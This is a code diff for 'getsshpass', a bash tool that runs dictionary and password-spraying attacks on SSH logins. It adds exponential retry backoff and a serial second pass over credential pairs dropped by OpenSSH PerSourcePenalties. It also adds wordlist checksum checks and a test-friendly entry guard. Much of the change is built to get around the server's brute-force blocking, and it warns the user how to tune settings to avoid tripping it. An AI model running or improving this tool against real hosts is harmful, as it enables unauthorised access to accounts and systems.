@@ -23,10 +23,14 @@ export LC_ALL=C
 # Constants and globals
 ##############################
 
-readonly VERSION="1.2"                                  # edit on every release
-readonly SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"  # script absolute path
+readonly VERSION="1.3"                                  # edit on every release
+SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"           # script absolute path
+readonly SCRIPT_DIR
 readonly STATE_BASE="${SCRIPT_DIR}/.getsshpass"         # per-host subdirs
-readonly RETRY_SLEEP="0.05"       # sleep between SSH connection error retries
+readonly RETRY_BACKOFF_BASE_MS=50    # initial retry backoff in ms (doubles each retry)
+readonly RETRY_BACKOFF_MAX_MS=5000   # per-sleep backoff cap in ms
+readonly RETRY_MAX_WAIT_MS=30000     # cumulative inline retry wait per pair before deferring
+                                     # to retry_skipped; ~outlasts min PerSourcePenalties block
 readonly POLL_SLEEP="0.05"        # sleep between job-slot availability polls
 readonly PID_PRUNE_THRESHOLD=200  # prune CHILD_PIDS when array exceeds this size
 
@@ -35,6 +39,7 @@ declare STATE_DIR=""          # per-host state subdirectory path
 declare RESULT_FILE=""        # path to result.txt (found credentials)
 declare RESUME_FILE=""        # path to resume.txt (last attempted pair)
 declare FILTERED_USERLIST=""  # path to filtered_users.txt (users with password)
+declare SKIPPED_FILE=""       # path to skipped.txt (pairs left untested after retries)
 
 declare port="22"         # target SSH port
 declare delay="0.04"      # delay between attempts in seconds
@@ -188,12 +193,13 @@ init_state_dir() {
   RESULT_FILE="${STATE_DIR}/result.txt"
   RESUME_FILE="${STATE_DIR}/resume.txt"
   FILTERED_USERLIST="${STATE_DIR}/filtered_users.txt"
+  SKIPPED_FILE="${STATE_DIR}/skipped.txt"
 }
 
 # Remove state files for a specific host or all hosts.
 clear_state_files() {
   if [[ -n "${host}" ]]; then
-    rm -rf "${STATE_BASE}/${host}"
+    rm -rf "${STATE_BASE:?}/${host}"
     printf 'State files cleared for host '\''%s'\''\n' "${host}"
   else
     rm -rf "${STATE_BASE}"
@@ -221,6 +227,12 @@ cleanup() {
     && rm -f "${COMBINED_PASSLIST}"
   [[ -n "${ASKPASS_SCRIPT}" && -f "${ASKPASS_SCRIPT}" ]] \
     && rm -f "${ASKPASS_SCRIPT}"
+
+  # If interrupted mid second-pass, fold un-retried pairs back into the skip
+  # file so penalty-skipped combinations are never lost.
+  [[ -n "${SKIPPED_FILE}" && -f "${SKIPPED_FILE}.pending" ]] \
+    && { cat "${SKIPPED_FILE}.pending" >> "${SKIPPED_FILE}"; \
+         rm -f "${SKIPPED_FILE}.pending"; }
 }
 
 ##############################
@@ -267,8 +279,9 @@ download_wordlist() {
   local name="${1}"
   local found=0
 
-  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
+  while IFS='|' read -r wl_name wl_file wl_desc wl_url wl_sha; do
     wl_url="${wl_url%$'\r'}"
+    wl_sha="${wl_sha%$'\r'}"
     [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
     if [[ "${name}" == "${wl_name}" ]]; then
       found=1
@@ -278,15 +291,26 @@ download_wordlist() {
       fi
       msg_info "Downloading '${wl_file}' (${wl_desc})..."
       if curl -fSL --progress-bar -o "${wl_file}" "${wl_url}"; then
-        local lines
-        lines="$(grep -c '' "${wl_file}")"
-        # Cursor up + carriage return + clear line:
-        # overwrites curl's progress bar
+        # Cursor up + carriage return + clear line: overwrites curl's progress bar
         printf '\033[A\r\033[K'
-        local fmt_lines
+        # Verify the checksum when the catalog pins one (5th field).
+        if [[ -n "${wl_sha}" ]]; then
+          local actual_sha
+          actual_sha="$(compute_sha256 "${wl_file}")"
+          if [[ -z "${actual_sha}" ]]; then
+            msg_warn "No SHA-256 utility found; skipping checksum verification"
+          elif [[ "${actual_sha}" != "${wl_sha}" ]]; then
+            msg_fail "Checksum mismatch for '${wl_file}'"
+            msg_fail "  expected ${wl_sha}"
+            msg_fail "  actual   ${actual_sha}"
+            rm -f "${wl_file}"
+            return 1
+          fi
+        fi
+        local lines fmt_lines
+        lines="$(grep -c '' "${wl_file}")"
         format_number "${lines}" fmt_lines
-        msg_ok "Downloaded '${wl_file}'" \
-          "(${fmt_lines} lines)"
+        msg_ok "Downloaded '${wl_file}' (${fmt_lines} lines)"
       else
         printf '\033[A\r\033[K'
         msg_fail "Failed to download '${wl_file}'"
@@ -319,6 +343,29 @@ format_number() {
     result+="${n:i:1}"
   done
   printf -v "${2}" '%s' "${result}"
+}
+
+# Sleep for MILLISECONDS, converting to the decimal seconds `sleep` expects.
+# Pure bash formatting; the only subprocess is sleep itself.
+sleep_ms() {
+  local -i ms="${1}"
+  local secs
+  printf -v secs '%d.%03d' "$(( ms / 1000 ))" "$(( ms % 1000 ))"
+  sleep "${secs}"
+}
+
+# Print the SHA-256 hex digest of FILE, or nothing (return 1) if no supported
+# hashing tool is available (sha256sum on Linux, shasum on macOS).
+compute_sha256() {
+  local file="${1}" out
+  if command -v sha256sum &>/dev/null; then
+    out="$(sha256sum "${file}")" || return 1
+  elif command -v shasum &>/dev/null; then
+    out="$(shasum -a 256 "${file}")" || return 1
+  else
+    return 1
+  fi
+  printf '%s' "${out%% *}"
 }
 
 ##############################
@@ -836,11 +883,16 @@ create_askpass_helper() {
     msg_fail "Cannot create temp file for SSH_ASKPASS helper"
     exit 1
   }
-  printf '#!/bin/sh\nprintf "%%s\\n" "${SSH_PASSWORD}"\n' \
-    > "${ASKPASS_SCRIPT}" || {
+  # The helper prints the password from its environment at ssh runtime; a
+  # quoted heredoc keeps ${SSH_PASSWORD} literal in the generated script.
+  if ! cat > "${ASKPASS_SCRIPT}" <<'HELPER'
+#!/bin/sh
+printf '%s\n' "${SSH_PASSWORD}"
+HELPER
+  then
     msg_fail "Cannot write SSH_ASKPASS helper script"
     exit 1
-  }
+  fi
   chmod +x "${ASKPASS_SCRIPT}" || {
     msg_fail "Cannot make SSH_ASKPASS helper script executable"
     exit 1
@@ -918,7 +970,7 @@ filter_users_by_password_auth() {
 
   msg_info "Filtering users by password authentication..."
 
-  > "${FILTERED_USERLIST}"  # truncate file to start fresh
+  : > "${FILTERED_USERLIST}"  # truncate file to start fresh
   local total_users
   total_users="$(grep -c '' "${userlist}")"
   declared_usercount="${total_users}"
@@ -1122,7 +1174,7 @@ try_ssh() {
   local user="${1}"
   local pass="${2}"
   local retval=1
-  local -i retries=0
+  local -i retries=0 backoff_ms="${RETRY_BACKOFF_BASE_MS}" waited_ms=0
 
   local ssh_err
   while true; do
@@ -1152,12 +1204,21 @@ try_ssh() {
 
     # Another job already found the password - stop retrying
     [[ -f "${RESULT_FILE}" ]] && return
-    if (( retries >= max_retries )); then
-      msg_warn "Max retries (${max_retries}) reached"
+    # Give up once the retry count or the cumulative inline wait is exhausted.
+    # A persistent drop here is usually OpenSSH 9.8+ PerSourcePenalties blocking
+    # this IP; instead of silently skipping the pair, record it so retry_skipped
+    # can cover it later once the connection flood has stopped.
+    if (( retries >= max_retries || waited_ms >= RETRY_MAX_WAIT_MS )); then
+      printf '%s\t%s\n' "${user}" "${pass}" >> "${SKIPPED_FILE}"
       return
     fi
     ((retries++))
-    sleep "${RETRY_SLEEP}"
+    # Exponential backoff rides out a short penalty window without stalling the
+    # whole parallel attack on a long one (which is deferred to retry_skipped).
+    sleep_ms "${backoff_ms}"
+    (( waited_ms += backoff_ms ))
+    (( backoff_ms *= 2 ))
+    (( backoff_ms > RETRY_BACKOFF_MAX_MS )) && backoff_ms="${RETRY_BACKOFF_MAX_MS}"
   done
 
   if [[ "${retval}" -eq 0 ]]; then
@@ -1218,6 +1279,13 @@ print_attack_config() {
     msg_info "Attack order:        users first"
   else
     msg_info "Attack order:        passwords first (spray)"
+  fi
+  # OpenSSH 9.8+ enables PerSourcePenalties by default: after repeated auth
+  # failures the server temporarily blocks the source IP, which can stall or
+  # invalidate an aggressive run. Warn when the settings are likely to trip it.
+  if (( max_jobs == 0 || max_jobs > 4 )); then
+    msg_warn "OpenSSH 9.8+ servers block repeated failures (PerSourcePenalties, on by default)."
+    msg_warn "Parallel jobs '${jobs_label}' may trigger it; if the run stalls, retry with -j 1 -w 5."
   fi
 }
 
@@ -1301,7 +1369,43 @@ launch_attack() {
   # Wait for all background try_ssh jobs before checking results
   wait
 
+  retry_skipped
   evaluate_result
+}
+
+# Second pass over pairs skipped during the main run because the server kept
+# dropping the connection (e.g. an active PerSourcePenalties block). Runs
+# serially so it does not re-trigger the penalty; anything still failing is left
+# in SKIPPED_FILE and reported as inconclusive rather than silently dropped.
+retry_skipped() {
+  [[ -f "${RESULT_FILE}" ]] && return
+  [[ -s "${SKIPPED_FILE}" ]] || return
+
+  # Tear down the pinned progress bar so plain log lines render normally.
+  if [[ -t 1 ]]; then
+    progress_bar_clear
+    PB_TRIED_ROW=0
+  fi
+
+  local skipped_count fmt_skipped
+  skipped_count="$(grep -c '' "${SKIPPED_FILE}")"
+  format_number "${skipped_count}" fmt_skipped
+  msg_warn "${fmt_skipped} pair(s) skipped during the run (connection penalties); retrying serially..."
+
+  # Rotate the skip file: pairs that still fail this pass are re-recorded into a
+  # fresh SKIPPED_FILE by try_ssh; cleanup() folds pending back on interrupt.
+  local pending="${SKIPPED_FILE}.pending"
+  mv "${SKIPPED_FILE}" "${pending}"
+  : > "${SKIPPED_FILE}"
+
+  local user pass
+  while IFS=$'\t' read -r user pass || [[ -n "${user}" ]]; do
+    [[ -f "${RESULT_FILE}" ]] && break
+    [[ -z "${user}" ]] && continue
+    msg_info "Retrying user: '${user}' password: '${pass}'"
+    try_ssh "${user}" "${pass}" </dev/null
+  done < "${pending}"
+  rm -f "${pending}"
 }
 
 # Check if a password was found and display results.
@@ -1315,11 +1419,21 @@ evaluate_result() {
       -1 "${GREEN}" "${RESET}" \
       "${GREEN}${BOLD}" "$(<"${RESULT_FILE}")" "${RESET}"
     elapsed_time
-    rm -f "${RESUME_FILE}"
+    rm -f "${RESUME_FILE}" "${SKIPPED_FILE}"
     exit 0
   else
     printf '\r\033[K'
-    msg_warn "Password not found. Try a different dictionary."
+    if [[ -s "${SKIPPED_FILE}" ]]; then
+      local skipped_count fmt_skipped
+      skipped_count="$(grep -c '' "${SKIPPED_FILE}")"
+      format_number "${skipped_count}" fmt_skipped
+      msg_warn "Password not found, but ${fmt_skipped} pair(s) could not be tested"
+      msg_warn "because the server kept dropping connections (result is INCONCLUSIVE)"
+      msg_warn "Untested pairs saved to '${SKIPPED_FILE}'"
+      msg_warn "Retry with gentler settings, e.g. -j 1 -w 5, to cover them"
+    else
+      msg_warn "Password not found. Try a different dictionary."
+    fi
     elapsed_time
     rm -f "${RESUME_FILE}"
     exit 1
@@ -1372,7 +1486,19 @@ setup_signal_handlers() {
 # Main execution flow
 ##############################
 
+# Abort on bash versions missing features the script relies on: safe empty-array
+# expansion under `set -u` (4.4+) and printf's %()T time format (4.2+). macOS
+# ships bash 3.2, so this turns a cryptic failure into an actionable message.
+check_bash_version() {
+  if (( BASH_VERSINFO[0] < 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 4) )); then
+    msg_fail "getsshpass requires bash 4.4 or newer (found ${BASH_VERSION})." \
+      "On macOS, install a newer bash, e.g. 'brew install bash'."
+    exit 1
+  fi
+}
+
 main() {
+  check_bash_version              # 0. Require a compatible bash
   read_args "${@}"                # 1. Parse command-line flags
   check_args                      # 2. Validate inputs and dependencies
   setup_signal_handlers           # 3. Set traps for clean shutdown
@@ -1384,4 +1510,8 @@ main() {
   launch_attack                   # 9. Run the dictionary attack
 }
 
-main "${@}"
+# Guard execution so the script can be sourced by the test suite without
+# running main; when run directly, BASH_SOURCE[0] equals $0.
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+  main "${@}"
+fi
